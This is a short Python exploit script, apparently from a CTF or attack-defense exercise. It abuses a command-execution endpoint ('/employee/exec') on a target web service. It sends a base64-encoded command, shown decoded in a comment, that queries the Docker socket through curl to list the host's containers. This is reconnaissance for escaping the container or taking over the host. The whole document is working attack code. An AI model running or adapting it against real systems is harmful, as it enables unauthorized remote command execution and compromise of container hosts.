from BaseExploit import *

import requests

def Docker_sock(host, port):
    url=f"http://{host}:{port}/employee/exec"
    # curl -s --unix-socket /run/docker.sock http:/v1.42/containers/json
    res = requests.get(
        url=url,
        headers="",
        cookies="",
        params={"cmd":"Y3VybCAtcyAtLXVuaXgtc29ja2V0IC9ydW4vZG9ja2VyLnNvY2sgaHR0cDovdjEuNDIvY29udGFpbmVycy9qc29u"},
    )
    # print(res.text)

Exploit(Docker_sock, args.host, args.port)()